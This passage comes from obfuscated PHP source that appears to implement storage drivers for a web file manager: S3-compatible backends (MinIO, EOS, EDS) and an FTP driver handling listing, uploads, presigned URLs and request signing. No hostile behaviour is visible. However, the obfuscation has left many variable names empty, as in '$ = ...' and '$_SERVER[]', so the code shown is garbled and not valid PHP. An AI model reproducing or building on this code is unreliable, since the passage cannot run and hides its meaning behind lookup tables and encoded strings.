!in_array($̔, $Ð[$⊵[85]])) { $Ð[$⊵[85]][] = $̔; } $ = $this->delByBatch($Ð[$⊵[86]]); if (!$) { return !1; } $ = $this->delByBatch($Ð[$⊵[85]]); if (!$) { return !1; } return $this->delFile($̔); } private function delByBatch($ԙĊ) { foreach (array_chunk($ԙĊ, 1000) as $) { $ = $this->client->deleteObjects($this->bucket, $); if (!$) { return !1; } } return !0; } public function rename($Ǌ, $մ) { return $this->renameObject($Ǌ, $մ); } public function listPath($ף, $ = false) { $ː =& $_SERVER[]; $ = $this->fileList($ף, $ː[8], !0); foreach ($[$ː[85]] as $¯ => $) { $[$ː[85]][$¯] = $this->folderInfo($, $, $); } foreach ($[$ː[86]] as $¯ => $) { $[$ː[86]][$¯] = $this->fileInfo($[$ː[32]], $, $); } return $; } protected function infoChildren($А, &$) { $ =& $_SERVER[]; $ā = $this->fileList($А, $[12], !0); $[$[81]] += count($ā[$[85]]); $[$[80]] += count($ā[$[86]]); foreach ($ā[$[86]] as $Е) { if (!$Е || !$Е[$[79]]) { continue; } $[$[79]] += $Е[$[79]]; } } private function fileInfo($, $ک = false, $ = array()) { $ =& $_SERVER[]; $ = array($[32] => $this->pathThis($), $[87] => $this->getPathOuter($), $[33] => $[230], $[166] => $this->ext($), $[79] => isset($[$[79]]) ? $[$[79]] : 0); if ($ک) { return $; } $[$[231]] = $[$[88]] = 0; $[$[232]] = $[$[233]] = !0; if (empty($)) { $ = $this->objectMeta($); if (!$) { return $; } } if (isset($[$[234]]) && $[$[234]]) { $[$[235]] = $[$[234]]; } if (isset($[$[204]])) { $[$[88]] = $[$[204]]; } if (isset($[$[79]])) { $[$[79]] = $[$[79]]; } return $; } private function folderInfo($Σ, $ɖ = false, $ǜ = array()) { $ =& $_SERVER[]; $ﺙ = array($[32] => $this->pathThis($Σ), $[87] => $this->getPathOuter($[8] . $Σ), $[33] => $[78]); if ($ɖ) { return $ﺙ; } $ﺙ[$[231]] = $ﺙ[$[88]] = 0; $ﺙ[$[232]] = $ﺙ[$[233]] = !0; if ($Σ == $[12]) { return $ﺙ; } if (empty($ǜ)) { $ǜ = $this->objectMeta(trim($Σ, $[8]) . $[8]); } if (isset($ǜ[$[204]])) { $ﺙ[$[231]] = $ǜ[$[204]]; } return $ﺙ; } private function fileList($ʳá, $Ѕ = '', $ = 0) { $ׯ =& $_SERVER[]; $ݕ٭ = rtrim($ʳá, $ׯ[8]) . $ׯ[8]; $ = $this->listObjs($ݕ٭, null, null, $Ѕ); if (!$) { return array($ׯ[85] => array(), $ׯ[86] => array()); } $Ϳ = $ʨ = array(); foreach ($[$ׯ[236]] as $Υ) { $Й = $Υ[$ׯ[32]]; if ($Й == $ݕ٭) { continue; } $ = isset($Υ[$ׯ[79]]) ? $Υ[$ׯ[79]] : 0; $ = $ == 0 && substr($Й, strlen($Й) - 1, 1) == $ׯ[8] ? !0 : !1; $this->cacheMethodInfoSet($Й, $, $Υ); if ($) { $Ϳ[] = $Й; continue; } $ʨ[] = $ ? $Υ : $Й; } foreach ($[$ׯ[237]] as $Υ) { $Ϳ[] = $Υ[$ׯ[32]]; $this->cacheMethodInfoSet($Υ[$ׯ[32]], !0); } $this->cacheMethodInfoSet($ʳá, !0); return array($ׯ[85] => $Ϳ, $ׯ[86] => $ʨ); } private function listObjs($, $ęӠ = null, $穉 = null, $ܬ = null) { $ =& $_SERVER[]; $ = trim($, $[8]); $ = empty($) && $ !== $[228] ? $[12] : $ . $[8]; return $this->client->getBucket($this->bucket, $, $ęӠ, $穉, $ܬ, !0); } public function has($, $ȝ = false, $ڒ = true) { $ꟕ =& $_SERVER[]; $ = trim($, $ꟕ[8]); $ݢ = empty($) && $ !== $ꟕ[228] ? $ꟕ[12] : $ . $ꟕ[8]; $­ = null; $ = 500; $ = $ꟕ[8]; $϶۴ = $ӳ = array(); while (!0) { $ = $this->listObjs($, $­, $, $); if (!$) { break; } $­ = $[$ꟕ[238]]; $ = $[$ꟕ[236]]; $ = $[$ꟕ[237]]; if (empty($) && empty($)) { break; } if (count($) == 1 && $[0][$ꟕ[32]] == $ݢ) { break; } if ($ȝ) { if (count($)) { $ = array_column($, $ꟕ[32]); $϶۴ = array_merge($϶۴, $); } if (count($)) { $ = array_column($, $ꟕ[32]); $ӳ = array_merge($ӳ, $); } if ($­ === null) { break; } continue; } if ($ڒ) { if (!empty($)) { if (count($) > 1 || isset($[0][$ꟕ[32]]) && $[0][$ꟕ[32]] != $ݢ) { return !0; } } } else { if (!empty($)) { return !0; } } if ($­ === null) { break; } } if ($ȝ) { $϶۴ = array_diff($϶۴, array($ݢ)); $϶۴ = count(array_unique($϶۴)); $ӳ = count(array_unique($ӳ)); return array($ꟕ[239] => $϶۴, $ꟕ[240] => $ӳ); } return !1; } public function listAll($) { $ =& $_SERVER[]; $ = $this->fileList($, $[12], !0); $ͫى = array_to_keyvalue($[$[86]], $[32]); foreach ($[$[85]] as $ݪ) { if (is_string($ݪ)) { $ͫى[$ݪ] = array($[79] => 0); } } return $this->listAllFiles($, $ͫى); } public function canRead($Ĉ) { $疓 =& $_SERVER[]; $ = $this->client->getAccessControlPolicy($this->bucket, $Ĉ); if (!$) { return !1; } return in_array($, array($疓[241], $疓[242], $疓[243])) ? !0 : !1; } public function canWrite($œ) { $ȭ =& $_SERVER[]; $؏׊ױ = $this->client->getAccessControlPolicy($this->bucket, $œ); if (!$؏׊ױ) { return !1; } return in_array($؏׊ױ, array($ȭ[241], $ȭ[242])) ? !0 : !1; } public function getContent($œ) { return $this->client->getObject($this->bucket, $œ); } public function setContent($, $ = '', $ = false) { $ =& $_SERVER[]; $ = $ ? trim($, $[8]) . $[8] : $; $ = get_file_mime(get_path_ext($)); $ = $this->client->putObject($, $this->bucket, $, $[229], array(), $); if (!$) { return !1; } if ($) { return !0; } return $ ? !0 : !1; } public function fileSubstr($, $ы, $) { $ꁖ = $ы + $ - 1; return $this->client->getObject($this->bucket, $, array($_SERVER[][244] => "\x62\x79\x74\145\163\x3d{$ы}\x2d{$ꁖ}")); } public function upload($޲ƻ, $䀸, $΀錡 = false, $ȁ = REPEAT_REPLACE) { $ =& $_SERVER[]; if (!$䀸 || !@file_exists($䀸)) { return !1; } $ = array($[245] => @md5_file($䀸)); $ƒ = array($[246] => get_file_mime(get_path_ext($޲ƻ))); if (IO::size($䀸) <= 1024 * 1024 * 200) { $ = $this->client->putObjectFile($䀸, $this->bucket, $޲ƻ, $[229], $, $ƒ); return !empty($) ? $this->getPathOuter($޲ƻ) : !1; } $إ = $this->client->multiUploadObject($䀸, $this->bucket, trim($޲ƻ, $[8]), $, $ƒ); return $إ ? $this->getPathOuter($޲ƻ) : !1; } public function download($, $) { if (!@is_dir($this->pathFather($)) && !IO::mkdir($this->pathFather($))) { return !1; } $֋졅 = $this->client->getObject($this->bucket, $, array(), $); return $֋졅 !== !1 ? $ : !1; } public function link($Ѯ, $瞅 = array()) { return $this->getPreSignedURL($Ѯ, 3600 * 12, $瞅); } private function getPreSignedURL($, $ސ, $ = array(), $ς = "\107\105\x54") { $ѯ =& $_SERVER[]; $ = trim($, $ѯ[8]); if ($this->signVer == $ѯ[247]) { return $this->client->getPreSignedV2URL($this->bucket, $, $ސ, $ς, $); } return $this->client->getPreSignedV4URL($this->bucket, $, $ސ, array(), $ς, $); } public function fileOut($ϵ, $ޜߖ = false, $ = false, $盝 = '') { $Δ =& $_SERVER[]; if ($this->isFileOutServer()) { return $this->fileOutServer($ϵ, $ޜߖ, $, $盝); } if (!$) { $ = $this->pathThis($ϵ); } $ׂ = get_file_mime(get_path_ext($)); if ($ׂ == $Δ[248]) { return parent::fileOut($ϵ, $ޜߖ, $, $盝); } $ĕ = array($Δ[249] => $ׂ); if ($ޜߖ) { $ĕ[$Δ[250]] = $Δ[251] . rawurlencode($); } else { } $ڐ = $this->link($ϵ, $ĕ); $this->fileOutLink($ڐ); } public function fileOutServer($Ǹ, $ = false, $⨝ = false, $ۥ = '') { parent::fileOut($Ǹ, $, $⨝, $ۥ); } public function fileOutImageServer($ն, $л = 250) { parent::fileOutImage($ն, $л); } public function fileOutLink($恲) { $睿 =& $_SERVER[]; if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($睿[67], $睿[66], $睿[68])) && !get_url_scheme($this->endpoint) && substr($恲, 0, 7) == $睿[216]) { $恲 = $睿[217] . substr($恲, 7); } header($睿[172] . $恲); die; } public function hashMd5($, $ = '') { $՘ = $this->objectMeta($); if (!$՘) { return !1; } $ = $ ? $ : _get($՘, $_SERVER[][252]); return $; } public function uploadFormData($, $ = 3600) { $̼ =& $_SERVER[]; if (!$this->_isClientAsync()) { $齊 = $this->getPreSignedURL($, $, array(), $̼[253]); return array($̼[206] => str_replace($̼[216], $̼[254], $齊)); } if (isset($GLOBALS[$̼[6]][$̼[92]][$̼[255]]) && $GLOBALS[$̼[6]][$̼[92]][$̼[255]] == $̼[228]) { return $this->uploadMultiData($, $); } if ($this->signVer == $̼[247]) { return $this->uploadFormDataV2($, $); } return $this->uploadFormDataV4($, $); } public function uploadFormDataV2($牛, $ = 3600) { $ =& $_SERVER[]; $ = $this->pathFather($牛); $ = $this->client->getHttpUploadPostParams($this->bucket, $, $[229], $); $ = array_merge((array) $, array($[256] => $[247], $[206] => $this->getHost())); if ($this->_isClientAsync()) { unset($[$[256]]); } return $; } public function uploadFormDataV4($, $Ƌ = 3600) { $ =& $_SERVER[]; $ = $[229]; $ǯ = $[257]; $ = $[62]; $ = gmdate($[258]); $ = gmdate($[259]); $ǡ = $[260]; $ = $Ƌ . $[12]; $ = $[261]; $ٗ΍ = array($this->accessKey, $, $this->region, $, $ǡ); $ = implode($[8], $ٗ΍); $Ëؒ = array($[262] => gmdate($[263], strtotime($[264])), $[265] => array(array($[266] => $this->bucket), array($[267], $[268], $[12]), array($[267], $[269], $[12]), array($[270] => $), array($[271] => $), array($[272] => $ǯ), array($[273] => $), array($[274] => $))); $ = base64_encode(json_encode($Ëؒ)); $ = hash_hmac($[275], $, $[276] . $this->secret, !0); $ = hash_hmac($[275], $this->region, $, !0); $Խ = hash_hmac($[275], $, $, !0); $ԙ = hash_hmac($[275], $ǡ, $Խ, !0); $዗ = hash_hmac($[275], $, $ԙ); $ = array($[246] => $[12], $[270] => $, $[277] => $, $[271] => $, $[272] => $ǯ, $[273] => $, $[274] => $, $[278] => $዗, $[256] => $[247], $[206] => $this->getHost()); if ($this->_isClientAsync()) { unset($[$[256]]); } return $; } public function uploadMultiData($ћ, $ԅڊ = 3600) { $ȅ丄 =& $_SERVER[]; $ = $this->signVer == $ȅ丄[247] ? gmdate($ȅ丄[279]) : gmdate($ȅ丄[280]); $ʹ = array(); $ = $this->client->getUploadId($this->bucket, $ћ, $ʹ); if (!$) { return !1; } $Ԃ = array($ȅ丄[281] => $, $ȅ丄[206] => $this->getHost() . $ȅ丄[8] . $this->pathEncode($ћ), $ȅ丄[282] => $, $ȅ丄[95] => $ћ, $ȅ丄[256] => $this->signVer); if ($this->_isClientAsync()) { unset($Ԃ[$ȅ丄[256]]); } return $Ԃ; } public function uploadMultiAuth($Ɠ, $Ǎ = array()) { $ʱ =& $_SERVER[]; if ($this->signVer == $ʱ[247]) { if (isset($Ǎ[$ʱ[283]])) { return $this->uploadPartAuthV2($Ɠ, $Ǎ); } return $this->uploadListAuthV2($Ɠ, $Ǎ); } if (isset($Ǎ[$ʱ[283]])) { return $this->uploadPartAuthV4($Ɠ, $Ǎ); } return $this->uploadListAuthV4($Ɠ, $Ǎ); } public function uploadPartAuthV2($, $Ӆ = array()) { $ϊ =& $_SERVER[]; $ = $Ӆ[$ϊ[95]]; $ = gmdate($ϊ[279]); $ς = array_intersect_key($Ӆ, array_flip(array($ϊ[283], $ϊ[281]))); ksort($ς); $ĝ = $ς ? $ϊ[76] . http_build_query($ς, null, $ϊ[284], PHP_QUERY_RFC3986) : $ϊ[12]; $ǜ = array($ϊ[253], $ϊ[12], $ϊ[120], $ϊ[12], "\x78\55\x61\x6d\172\55\144\141\x74\x65\72{$}", $ϊ[8] . $this->bucket . $ϊ[8] . $this->pathEncode($) . $ĝ); $󲕬 = implode($ϊ[285], $ǜ); $ﾉ = $this->client->__getSignature($󲕬); return array($ϊ[286] => $ﾉ, $ϊ[282] => $); } public function uploadListAuthV2($ƦҢ, $λ = array()) { $߳ =& $_SERVER[]; $ = $λ[$߳[95]]; $ɷ = $λ[$߳[281]]; $ = $this->client->listParts($this->bucket, $, $ɷ); if (!$) { return !1; } $Ձ = gmdate($߳[279]); $ήֹ = $߳[287] . $ɷ; $糎 = array($߳[288], $߳[12], $߳[120], $߳[12], "\x78\x2d\141\155\172\x2d\144\141\164\145\x3a{$Ձ}", $߳[8] . $this->bucket . $߳[8] . $this->pathEncode($) . $ήֹ); $ = implode($߳[285], $糎); $Ѳ = $this->client->__getSignature($); return array($߳[286] => $Ѳ, $߳[282] => $Ձ, $߳[289] => $); } public function uploadPartAuthV4($ε, $ضͷ = array()) { $ =& $_SERVER[]; $硼 = $ضͷ[$[95]]; $ = array($[273] => gmdate($[280]), $[290] => _get($ضͷ, $[291], hash($[275], $[12]))); $ԁ = explode($[208], $this->getHost()); $ = array($[292] => $ԁ[1], $[293] => $[12], $[246] => $[120], $[294] => $ضͷ[$[79]]); $ = $[253]; $Ϣ = $[8] . $this->pathEncode($硼); $ԝɈ = array_intersect_key($ضͷ, array_flip(array($[283], $[281]))); $ = $this->client->__getSignatureV4($, $, $, $Ϣ, $ԝɈ); return array($[286] => $, $[290] => $[$[290]], $[282] => $[$[273]]); } public function uploadListAuthV4($, $놱 = array()) { $ =& $_SERVER[]; $ = $놱[$[95]]; $ = $놱[$[281]]; $ = $this->client->listParts($this->bucket, $, $); if (!$) { return !1; } $ʝ = $[295]; foreach ($ as $) { $ʝ .= $[296] . "\x3c\x50\x61\162\164\116\x75\155\x62\145\162\x3e{$[$[297]]}\74\57\x50\x61\162\164\116\165\x6d\x62\x65\162\76\12" . "\x3c\x45\124\141\x67\76{$[$[298]]}\x3c\57\x45\x54\141\147\76\12" . $[299]; } $ʝ .= $[300]; $ = array($[273] => gmdate($[280]), $[290] => hash($[275], $ʝ)); $ = explode($[208], $this->getHost()); $ᨇ = array($[292] => $[1], $[246] => $[120], $[294] => strlen($ʝ)); $ϸ = $[288]; $۽ = $[8] . $this->pathEncode($); $ = array($[281] => $); $ǯ = $this->client->__getSignatureV4($, $ᨇ, $ϸ, $۽, $); return array($[286] => $ǯ, $[290] => $[$[290]], $[282] => $[$[273]], $[289] => $); } private function _isClientAsync() { $ =& $_SERVER[]; static $ = null; if ($ === null) { $ڬ = isset($_REQUEST[$[301]]) ? json_decode($_REQUEST[$[301]], !0) : !1; $ = $ڬ && _get($ڬ, $[302]) == $[303]; } return $; } public function getHost() { $グ =& $_SERVER[]; $̜ = parent::getHost(); if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($グ[70], $グ[64], $グ[69], $グ[62]))) { return $̜ . $グ[8] . $this->bucket; } if ($this->osType == $グ[62] && !is_domain($̜)) { return $̜ . $グ[8] . $this->bucket; } $̜ = explode($グ[208], $̜); return $̜[0] . $グ[208] . $this->bucket . $グ[10] . $̜[1]; } public function size($) { $М = $this->objectMeta($); return $М ? $М[$_SERVER[][79]] : 0; } public function info($Ƕ) { if ($this->isFolder($Ƕ)) { return $this->folderInfo($Ƕ); } else { if ($this->isFile($Ƕ)) { return $this->fileInfo($Ƕ); } } return !1; } public function exist($) { return $this->isFile($) || $this->isFolder($); } public function isFile($) { return !$this->isFolder($) && $this->objectMeta($); } public function isFolder($̽͵) { return $this->cacheMethod($_SERVER[][177], $̽͵); } protected function objectMeta($ͬ) { return $this->cacheMethod($_SERVER[][179], $ͬ); } protected function _objectMeta($) { $ڒ =& $_SERVER[]; $ = rtrim($, $ڒ[8]); try { $ = $this->client->getObjectInfo($this->bucket, $); if (!isset($[$ڒ[252]]) && isset($[$ڒ[304]])) { $[$ڒ[252]] = $[$ڒ[304]]; } } catch (Exception $) { $ = !1; } if (!$) { } return $; } protected function _isFolder($؊) { $ =& $_SERVER[]; $؊ = rtrim($؊, $[8]) . $[8]; if ($؊ == $[12] || $؊ == $[8]) { return !0; } $گҖ = $this->client->getBucket($this->bucket, $؊, null, 1); if (empty($گҖ[$[236]])) { return !1; } $ɬߏ = $گҖ[$[236]][0][$[32]]; return stripos($ɬߏ, $؊) === 0 ? !0 : !1; if (substr($ɬߏ, -1) == $[8]) { return !0; } if (get_path_this($ɬߏ) == get_path_this($؊)) { return !1; } return !0; } public function listObject($ƣ) { return $this->fileList($ƣ, $_SERVER[][12], !0); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($) { $ʔ =& $_SERVER[]; parent::__construct($); $this->setSignVersion($ʔ[247]); if (!$this->region) { $this->region = $ʔ[305]; $this->setRegion($this->region); } $this->client->setHeadValid(!1); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function uploadFormData($, $ = 3600) { $۝ =& $_SERVER[]; $ = $۝[229]; $ވ = $۝[257]; $՛ = $۝[62]; $̨ = gmdate($۝[258]); $ = gmdate($۝[259]); $ = $۝[260]; $մԁ = $ . $۝[12]; $È = $۝[261]; $ = array($this->accessKey, $, $this->region, $՛, $); $ = implode($۝[8], $); $А = array($۝[262] => gmdate($۝[263], strtotime($۝[264])), $۝[265] => array(array($۝[266] => $this->bucket), array($۝[306] => $), array($۝[267], $۝[268], $۝[12]), array($۝[267], $۝[269], $۝[12]), array($۝[267], $۝[307], $۝[12]), array($۝[270] => $È), array($۝[271] => $), array($۝[272] => $ވ), array($۝[273] => $̨), array($۝[274] => $մԁ))); $ = base64_encode(json_encode($А)); $ = hash_hmac($۝[275], $, $۝[276] . $this->secret, !0); $ = hash_hmac($۝[275], $this->region, $, !0); $ = hash_hmac($۝[275], $՛, $, !0); $о = hash_hmac($۝[275], $, $, !0); $  = hash_hmac($۝[275], $, $о); $ډꠕ = array($۝[246] => $۝[12], $۝[294] => $۝[12], $۝[306] => $, $۝[270] => $È, $۝[277] => $, $۝[308] => $, $۝[309] => $ވ, $۝[310] => $̨, $۝[311] => $մԁ, $۝[312] => $ , $۝[206] => $this->getHost()); return $ډꠕ; } } goto d; Dϓᵈ: class PathDriverEDS extends PathDriverBaseS3 { public function __construct($) { parent::__construct($); $this->setSignVersion($_SERVER[][247]); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($Σ) { parent::__construct($Σ); $this->setSignVersion($_SERVER[][247]); } public function uploadFormData($, $ʜ = 3600) { $ =& $_SERVER[]; $ = $[229]; $ߖ҂ = $[257]; $շ = $[62]; $ᓾ = gmdate($[258]); $ = gmdate($[259]); $ = $[260]; $ϸ = $ʜ . $[12]; $ = $[261]; $բ = array($this->accessKey, $, $this->region, $շ, $); $Γ = implode($[8], $բ); $ϩ = array($[262] => gmdate($[1519], strtotime($[264])), $[265] => array(array($[266] => $this->bucket), array($[306] => $), array($[267], $[268], $[12]), array($[267], $[269], $[12]), array($[267], $[307], $[12]), array($[270] => $), array($[271] => $Γ), array($[272] => $ߖ҂), array($[273] => $ᓾ), array($[274] => $ϸ))); $ = base64_encode(json_encode($ϩ)); $̭ = hash_hmac($[275], $, $[276] . $this->secret, !0); $Ӻ = hash_hmac($[275], $this->region, $̭, !0); $ = hash_hmac($[275], $շ, $Ӻ, !0); $߬ = hash_hmac($[275], $, $, !0); $ = hash_hmac($[275], $, $߬); $ߑ = array($[246] => $[12], $[294] => $[12], $[306] => $, $[270] => $, $[277] => $, $[308] => $Γ, $[309] => $ߖ҂, $[310] => $ᓾ, $[311] => $ϸ, $[312] => $, $[206] => $this->getHost()); return $ߑ; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; public $config = array(); public function __construct($) { parent::__construct(); if (count($) > 0) { $this->_init($); } } public function __destruct() { if (!$this->_isconn(!1)) { return !1; } return @ftp_close($this->connect); } private function charsetReset($ˍۥ) { $ǥ =& $_SERVER[]; global $config; $this->appCharset = $config[$ǥ[1640]]; $this->systemCharset = $config[$ǥ[1641]]; if (isset($ˍۥ[$ǥ[1642]]) && $ˍۥ[$ǥ[1642]]) { $this->systemCharset = $ˍۥ[$ǥ[1642]]; } } public function iconvApp($ܒ) { return $this->iconvTo($ܒ, $this->systemCharset, $this->appCharset); } public function iconvSystem($ޙ) { return $this->iconvTo($ޙ, $this->appCharset, $this->systemCharset); } public function getPathOuter($) { $ɘ =& $_SERVER[]; $ⷍ = $this->iconvApp($this->pathBase); $ = $this->iconvApp($); if (substr($ⷍ, 0, 2) == $ɘ[1517]) { $ⷍ = BASIC_PATH . substr($ⷍ, 2); } if (substr($, 0, 2) == $ɘ[1517]) { $ = BASIC_PATH . substr($, 2); } $ⷍ = KodIO::clear($ⷍ); $ = KodIO::clear($); $ = substr($, strlen($ⷍ)); if (empty($this->pathDriver)) { return $; } return $this->pathDriver . $ɘ[8] . ltrim($, $ɘ[8]); } private function _init($҄ = array()) { $ɸȴ =& $_SERVER[]; if (!function_exists($ɸȴ[1643])) { throw new Exception(LNG($ɸȴ[1644])); } $this->config = $҄; $this->charsetReset($҄); foreach ($҄ as $ƀ => $ꆊ) { if (isset($this->{$ƀ})) { $this->{$ƀ} = $ꆊ; } } return $this->_login($҄); } private function _login($) { $݌ =& $_SERVER[]; static $ = array(); $և써 = md5(json_encode($)); if (isset($[$և써])) { foreach ($[$և써] as $ => $㺙) { $this->{$} = $㺙; } return !0; } $˚ = parse_url(trim($this->server, $݌[8])); $this->host = $˚[$݌[206]]; $ = isset($˚[$݌[205]]) && $˚[$݌[205]] == $݌[1645] ? !0 : !1; $this->scheme = $ ? $݌[1646] : $݌[1647]; $this->port = isset($˚[$݌[207]]) ? $˚[$݌[207]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 30); if ($this->connect === !1) { $this->writeLog(LNG($݌[1648]) . $this->host . $݌[4] . $this->port, !0); return !1; } $˕۠ = @ftp_login($this->connect, $this->username, $this->userpass); if (!$˕۠) { $this->writeLog(LNG($݌[1649]) . $this->username, !0); return !1; } $this->ftpPath = @ftp_pwd($this->connect); @ftp_chdir($this->connect, $݌[8]); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $ = $this->pasv == $݌[91] ? !0 : !1; @ftp_pasv($this->connect, $); $[$և써] = array($݌[1650] => $this->connect, $݌[206] => $this->host, $݌[205] => $this->scheme, $݌[207] => $this->port); return $˕۠; } private function _isconn($ᪿ = true) { if (is_resource($this->connect)) { return !0; } if (!$ᪿ) { return !1; } return $this->_login($this->config); } public function mkfile($¸, $ݤ = '', $ = REPEAT_RENAME) { if ($this->setContent($¸, $ݤ)) { return $this->getPathOuter($¸); } $this->writeLog(LNG($_SERVER[][1651]), !0); return !1; } public function mkdir($, $ = REPEAT_SKIP) { $ =& $_SERVER[]; if (!$ || $ == $[8]) { return !0; } if (!$this->_isconn()) { return !1; } $ = $this->iconvSystem($); if ($this->_isFolder($) || @ftp_mkdir($this->connect, $)) { return $this->getPathOuter($); } if (!$this->mkdir($this->pathFather($))) { return !1; } if ($ = @ftp_mkdir($this->connect, $)) { return $this->getPathOuter($); } $ = __FUNCTION__ . $[1652]; $this->writeLog($, !0); return !1; } public function copyFile($γ, $) { if (!$this->_isconn()) { return !1; } $ϑ = $this->pathThis($this->iconvSystem($γ)); $˕ = $this->tempFile($ϑ); $ = $this->iconvApp($˕); $this->download($γ, $); $ʢ = $this->upload($, $); $this->tempFileRemve($˕); return $ʢ; } public function moveFile($, $ı) { if (!$this->_isconn()) { return !1; } $ = $this->iconvSystem($); $ı = $this->iconvSystem($ı); $؏ = @ftp_rename($this->connect, $, $ı); if (!$؏) { $this->writeLog(__FUNCTION__ . $_SERVER[][1652], !0); return !1; } return $this->getPathOuter($ı); } public function delFile($֢) { if (!$this->_isconn()) { return !1; } $֢ = $this->iconvSystem($֢); $ = @ftp_delete($this->connect, $֢); if (!$) { $this->writeLog(__FUNCTION__ . $_SERVER[][1652], !0); } return $; } public function delFolder($) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $ = $Ͳ谨 = array(); $this->fileList($, $, $Ͳ谨, !0); $this->listItemCache = !0; foreach ($Ͳ谨 as $) { $뇅 = $this->iconvSystem($[$_SERVER[][32]]); $󶫤 = @ftp_delete($this->connect, $뇅); if (!$󶫤) { return !1; } } foreach ($ as $뇅) { $뇅 = $this->iconvSystem($뇅); $󶫤 = @ftp_rmdir($this->connect, $뇅); if (!$󶫤) { return !1; } } $ = $this->iconvSystem($); return @ftp_rmdir($this->connect, $); } public function rename($, $ұ) { $ =& $_SERVER[]; if (!$this->_isconn()) { return !1; } $ = $this->fileNameAuto($this->pathFather($), $ұ); $ = $this->iconvSystem($); $ = $this->iconvSystem($); $ = $this->pathFather($); $ = rtrim($, $[8]) . $[8] . $; $ǜ = @ftp_rename($this->connect, $, $); if (!$ǜ) { $this->writeLog(__FUNCTION__ . $[1652], !0); return !1; } $ = $this->iconvApp($); return $this->getPathOuter($); } private function folderInfo($廬, $֏ = false) { $ؔ =& $_SERVER[]; $ɰ = array($ؔ[32] => $this->pathThis($廬), $ؔ[87] => $this->getPathOuter($ؔ[8] . $廬), $ؔ[33] => $ؔ[78]); if ($֏) { return $ɰ; } $ɰ[$ؔ[231]] = $ɰ[$ؔ[88]] = 0; $ɰ[$ؔ[232]] = $ɰ[$ؔ[233]] = !0; return $ɰ; } private function fileInfo($聗, $ = false, $ӄ = array()) { $ =& $_SERVER[]; $ȴ = array($[32] => $this->pathThis($聗), $[87] => $this->getPathOuter($[8] . $聗), $[33] => $[230], $[79] => isset($ӄ[$[79]]) ? $ӄ[$[79]] : 0, $[166] => $this->ext($聗)); if ($) { return $ȴ; } $ȴ[$[231]] = $ȴ[$[88]] = 0; $ȴ[$[232]] = $ȴ[$[233]] = !0; $ں = $this->iconvSystem($聗); $ȴ[$[88]] = @ftp_mdtm($this->connect, $ں); if (empty($ӄ)) { $ӄ = $this->objectMeta($聗); if (!$ӄ) { return $ȴ; } } $ȴ[$[79]] = $ӄ[$[79]]; return $ȴ; } public function size($̋) { $޺Щ = $this->objectMeta($̋); return $޺Щ ? $޺Щ[$_SERVER[][79]] : 0; } public function info($) { if ($this->isFile($)) { return $this->fileInfo($, 0); } else { if ($this->isFolder($)) { return $this->folderInfo($); } } return !1; } private function fileList($, &$؄, &$ņ׊, $ = false) { $ݑ =& $_SERVER[]; $ = $this->iconvSystem($); if (!$this->isFolder($)) { return !1; } $ = rtrim($, $ݑ[8]) . $ݑ[8]; check_abort(); $ = @ftp_rawlist($this->connect, $); if (!$) { $ = array(); } $ = array($ݑ[10] => 1, $ݑ[1462] => 1); foreach ($ as $) { $Ȝϕ = $this->_listItem($); if ($Ȝϕ[0] == $ݑ[853]) { continue; } $ = $Ȝϕ[8]; if (empty($) && $ !== $ݑ[228] || isset($[$])) { continue; } $ = $this->iconvApp($ . ltrim($, $ݑ[8])); $ӄ = array($ݑ[32] => $, $ݑ[33] => $ݑ[230], $ݑ[79] => $Ȝϕ[4]); if (substr($, 0, 1) == $ݑ[1653]) { $ӄ[$ݑ[33]] = $ݑ[78]; $ӄ[$ݑ[79]] = 0; } $ = $ӄ[$ݑ[33]] == $ݑ[78] ? !0 : !1; $this->cacheMethodInfoSet($, $, $ӄ); if ($) { $؄[] = $; if ($) { $this->fileList($, $؄, $ņ׊, $); } continue; } $ņ׊[] = $ӄ; } $this->cacheMethodInfoSet($, !0); } private function _listItem($Ɩ) { if (empty($Ɩ)) { return array(); } $ԅ = preg_split($_SERVER[][1654], $Ɩ); if (count($ԅ) <= 9) { return $ԅ; } $ԅ[8] = trim(substr($Ɩ, strpos($Ɩ, $ԅ[7]) + strlen($ԅ[7]))); return array_splice($ԅ, 0, 9); } public function listPath($Ի, $ձڧ = false) { $ =& $_SERVER[]; if (!$this->_isconn()) { return !1; } $ = $ʝ = array(); $this->fileList($Ի, $, $ʝ); foreach ($ as $둀 => $) { $[$둀] = $this->folderInfo($, $ձڧ); } foreach ($ʝ as $둀 => $) { $ʝ[$둀] = $this->fileInfo($[$[32]], $ձڧ, $); } return array($[85] => $, $[86] => $ʝ); } public function has($ɬ, $ = false, $ = true) { $ =& $_SERVER[]; $͊ = $Ј = array(); $ꠐ = $ ? !0 : !1; $this->fileList($ɬ, $͊, $Ј, $ꠐ); if ($) { return array($[239] => count($Ј), $[240] => count($͊)); } if ($) { if (count($Ј)) { return !0; } } else { if (count($͊)) { return !0; } } return !1; } public function listAll($) { $ٗ =& $_SERVER[]; if (!$this->_isconn()) { return !1; } $ = $ϟ = array(); $this->fileList($, $, $ϟ, !0); $㘱 = array_to_keyvalue($ϟ, $ٗ[32]); foreach ($ as $) { if (is_string($)) { $㘱[$] = array($ٗ[79] => 0); } } return $this->listAllFiles($, $㘱); } public function getContent($뚯) { if (!$this->_isconn()) { return !1; } $뚯 = $this->iconvSystem($뚯); return $this->fileSubstr($뚯); } public function setContent($脌, $̕ = '') { if (!$this->_isconn()) { return !1; } $ = $this->pathThis($this->iconvSystem($脌)); $ = $this->tempFile($); file_put_contents($, $̕); $ = $this->upload($脌, $this->iconvApp($)); $this->tempFileRemve($); return $; } public function fileSubstr($ʔɌ, $ڦ = 0, $Ԍ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($ʔɌ, $ڦ, $Ԍ); } private function ftpRequest($, $Ю = 0, $ۛ = false) { $ʂ =& $_SERVER[]; $ = $ʂ[8] . ltrim(str_ltrim($, $this->ftpPath), $ʂ[8]); $ = $this->iconvSystem($); $ۊ = $this->scheme . $this->host . $ʂ[4] 